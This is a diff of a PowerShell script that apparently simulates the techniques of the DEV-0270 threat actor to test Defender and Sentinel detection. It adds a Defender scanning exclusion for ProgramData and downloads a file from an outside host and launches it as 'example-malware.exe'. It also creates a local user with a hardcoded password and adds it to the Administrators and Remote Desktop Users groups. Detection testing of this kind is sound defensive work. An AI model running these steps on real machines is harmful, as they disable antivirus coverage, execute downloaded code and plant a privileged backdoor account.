@@ -1,42 +1,52 @@
 #Created for testing of Issue #356: Dev-0270 Malicious Powershell usage
 Write-Host "Starting DEV-0270 PowerShell Simulation..." -ForegroundColor Cyan
 
-# **Pattern 1: Add-MpPreference - Exclude ProgramData from Defender Scanning**
+# **Fix TLS Issues Before Invoke-WebRequest**
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# **Pattern 1: Add Defender Exclusion**
 Write-Host "[+] Attempting to add Microsoft Defender exclusion for ProgramData..."
 try {
     Add-MpPreference -ExclusionPath "C:\ProgramData"
 } catch {
     Write-Host "[-] Failed to add exclusion" -ForegroundColor Yellow
 }
+Start-Sleep -Seconds 2
 
-Start-Sleep -Seconds 30  # Pause for logging
-
-Start-Sleep -Seconds 2  # Pause for logging
-
-# **Pattern 3: Fake Malware Download using Invoke-WebRequest**
-Write-Host "[+] Simulating malicious file download using Invoke-WebRequest..."
+# **Pattern 2: Simulating Malicious File Download**
+Write-Host "[+] Simulating malicious file download..."
 $file = "$env:ProgramData\example-malware.exe"
-Invoke-WebRequest -Uri "https://speed.hetzner.de/100MB.bin" -OutFile $file
-Start-Process -FilePath "dllhost.exe" -ArgumentList "/c $file"
+try {
+    Invoke-WebRequest -Uri "https://speed.hetzner.de/100MB.bin" -OutFile $file
+    Start-Process -FilePath "dllhost.exe" -ArgumentList "/c $file"
+} catch {
+    Write-Host "[-] File download failed. Possible TLS issue." -ForegroundColor Yellow
+}
+Start-Sleep -Seconds 2
 
-Start-Sleep -Seconds 2  # Pause for logging
-
-# **Pattern 4: Add User to Administrators and RDP Users**
-Write-Host "[+] Attempting to add a test user to Administrators and RDP Users groups..."
+# **Pattern 3: Creating and Adding User to Groups**
 $user = "TestUser"
-$admins = [System.Security.Principal.SecurityIdentifier]"S-1-5-32-544".Translate([System.Security.Principal.NTAccount]).Value
-$rdp = [System.Security.Principal.SecurityIdentifier]"S-1-5-32-555".Translate([System.Security.Principal.NTAccount]).Value
+$adminsGroup = "Administrators"
+$rdpGroup = "Remote Desktop Users"
 
-# Add user to Administrators group
-net localgroup Administrators $user /add
-# Add user to Remote Desktop Users group
-net localgroup "Remote Desktop Users" $user /add
+# Check if user exists, remove if necessary
+if (Get-LocalUser -Name $user -ErrorAction SilentlyContinue) {
+    Write-Host "[-] TestUser already exists. Removing..."
+    Remove-LocalUser -Name $user
+}
 
-Write-Host "Simulation Complete! Check DeviceProcessEvents logs." -ForegroundColor Green
+Write-Host "[+] Creating test user..."
+New-LocalUser -Name $user -Password (ConvertTo-SecureString "P@ssword123" -AsPlainText -Force) -FullName "Test User" -Description "Test Account"
 
-# **Cleanup (Remove user from groups)**
-Write-Host "[+] Cleaning up test environment..."
-net localgroup Administrators $user /delete
-net localgroup "Remote Desktop Users" $user /delete
+Write-Host "[+] Adding user to Administrators group..."
+Add-LocalGroupMember -Group $adminsGroup -Member $user
+
+Write-Host "[+] Adding user to RDP Users group..."
+Add-LocalGroupMember -Group $rdpGroup -Member $user
+
+Write-Host "Simulation Complete! Check Defender & Sentinel." -ForegroundColor Green
+
+# **Cleanup**
+Write-Host "[+] Cleaning up..."
+Remove-LocalUser -Name $user
 Write-Host "Cleanup complete."
-
